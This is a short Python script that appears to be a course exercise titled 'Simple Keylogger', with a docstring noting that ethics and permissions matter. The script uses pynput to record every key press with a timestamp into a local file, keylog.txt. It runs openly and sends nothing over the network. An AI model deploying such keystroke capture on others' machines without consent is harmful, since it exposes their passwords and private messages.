'''
Task # 04
Simple Keylogger
Create a basic keylogger program that records and logs keystrokes. 
Focus on logging the keys pressed and saving them to a file. 
Note: Ethical considerations and permissions are crucial for 
projects involving keyloggers.
'''

from pynput import keyboard
import time

def on_key_press(key):
    log_file = open("keylog.txt", "a")
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    log_file.write(f"{timestamp} - {key}\n")
    log_file.close()

def main():
    print("Press Ctrl+C to stop logging.")
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()